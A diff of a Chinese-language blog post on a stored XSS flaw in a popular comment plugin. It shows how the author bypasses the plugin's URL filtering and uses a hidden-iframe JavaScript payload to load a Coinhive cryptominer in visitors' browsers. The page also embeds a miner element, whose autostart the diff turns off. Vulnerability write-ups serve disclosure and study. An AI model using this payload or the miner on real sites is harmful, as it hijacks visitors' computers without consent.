@@ -29,7 +29,7 @@
 <div class="coinhive-miner" 
     style="height: 80px"
     data-key="3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo"
-    data-autostart="true"
+    data-autostart="false"
     data-whitelabel="true"
     data-background="#000000"
     data-text="#eeeeee"
@@ -174,18 +174,18 @@
 <h2 id="toc_2">影响</h2>
 
 <p>通过github查找，大概可以发现37k左右使用该插件的网站。可见影响范围之广。<br/>
-<img src="media/15486160900429/15486401543146.jpg" alt="" style="width:996px;"/></p>
+<img src="media/15486160900429/15486401543146.jpg" alt="" class="mw_img_center" style="width:996px;display: block; clear:both; margin: 0 auto;"/></p>
 
 <h2 id="toc_3">复现过程</h2>
 
 <p>首先在输入框内输入XSS代码：<br/>
-<img src="media/15486160900429/15486401902694.jpg" alt="" style="width:1007px;"/><br/>
+<img src="media/15486160900429/15486401902694.jpg" alt="" class="mw_img_center" style="width:1007px;display: block; clear:both; margin: 0 auto;"/><br/>
 抓包：<br/>
-<img src="media/15486160900429/15486402402593.jpg" alt="" style="width:1011px;"/><br/>
+<img src="media/15486160900429/15486402402593.jpg" alt="" class="mw_img_center" style="width:1011px;display: block; clear:both; margin: 0 auto;"/><br/>
 发现前台已经将XSS过滤，修改数据包：<br/>
-<img src="media/15486160900429/15486402614789.jpg" alt="" style="width:1009px;"/><br/>
+<img src="media/15486160900429/15486402614789.jpg" alt="" class="mw_img_center" style="width:1009px;display: block; clear:both; margin: 0 auto;"/><br/>
 放行数据包后，刷新页面页面：<br/>
-<img src="media/15486160900429/15486402797187.jpg" alt="" style="width:1009px;"/><br/>
+<img src="media/15486160900429/15486402797187.jpg" alt="" class="mw_img_center" style="width:1009px;display: block; clear:both; margin: 0 auto;"/><br/>
 存储型XSS一枚。</p>
 
 <h2 id="toc_4">危害</h2>
@@ -218,7 +218,7 @@ miner.start();
 <img src="media/15486160900429/15487800089053.jpg" alt="" class="mw_img_center" style="width:1309px;display: block; clear:both; margin: 0 auto;"/><br/>
 从返回的数据包中，可以看到我们接收到的数据正是我们想要。<br/>
 但是进入页面查看一下，妈卖批为啥不执行。。。。。。。<br/>
-<img src="media/15486160900429/15487801055831.jpg" alt="" style="width:971px;"/><br/>
+<img src="media/15486160900429/15487801055831.jpg" alt="" class="mw_img_center" style="width:971px;display: block; clear:both; margin: 0 auto;"/><br/>
 通过审查元素发现，原来是这个评论插件为自动为URL地址加上A标签。现在只有想办法绕过一下。<br/>
 测试了N种情况，发现这个URL地址没有办法绕过，只能想办法拼接URL。但是现在URL并不在script内部，无法使用注释或函数拼接。<br/>
 那我们不妨尝试一下DOM，先选一个id吧，直接覆盖。<br/>
@@ -226,7 +226,7 @@ miner.start();
 就选这个吧，这个好看～ 现在控制台尝试一下：<br/>
 <img src="media/15486160900429/15487805921556.jpg" alt="" class="mw_img_center" style="width:1006px;display: block; clear:both; margin: 0 auto;"/><br/>
 这里使用+对URL进行拼接，查看一下源码：<br/>
-<img src="media/15486160900429/15487806222248.jpg" alt="" style="width:994px;"/><br/>
+<img src="media/15486160900429/15487806222248.jpg" alt="" class="mw_img_center" style="width:994px;display: block; clear:both; margin: 0 auto;"/><br/>
 开心哈哈哈哈，现在效果达到，但是特么的为什么没有运行呢？？？？？<br/>
 <img src="media/15486160900429/15487809318901.jpg" alt="" class="mw_img_center" style="width:843px;display: block; clear:both; margin: 0 auto;"/><br/>
 大概就是这么个意思，那好吧，那就换种方法，使用iframe加载总可以了吧。<br/>
@@ -238,11 +238,11 @@ miner.start();
 <code>&lt;script&gt;document.getElementById(&quot;toast&quot;).innerHTML=&quot;&lt;iframe+src=http&quot;.concat(&quot;s://url.rul/YouUrl+style=&#39;display:&quot;).concat(&quot;none;&#39;&gt;&lt;/iframe&gt;&quot;)&lt;/script&gt;</code></p>
 
 <p>查看效果：<br/>
-<img src="media/15486160900429/15487814765030.jpg" alt="" style="width:948px;"/><br/>
+<img src="media/15486160900429/15487814765030.jpg" alt="" class="mw_img_center" style="width:948px;display: block; clear:both; margin: 0 auto;"/><br/>
 查看DOM插入的iframe：<br/>
-<img src="media/15486160900429/15487815962339.jpg" alt="" style="width:996px;"/><br/>
+<img src="media/15486160900429/15487815962339.jpg" alt="" class="mw_img_center" style="width:996px;display: block; clear:both; margin: 0 auto;"/><br/>
 看到CPU利用率我就开心哈哈哈哈：<br/>
-<img src="media/15486160900429/15487816280291.jpg" alt="" style="width:1671px;"/></p>
+<img src="media/15486160900429/15487816280291.jpg" alt="" class="mw_img_center" style="width:1671px;display: block; clear:both; margin: 0 auto;"/></p>
 
 
     
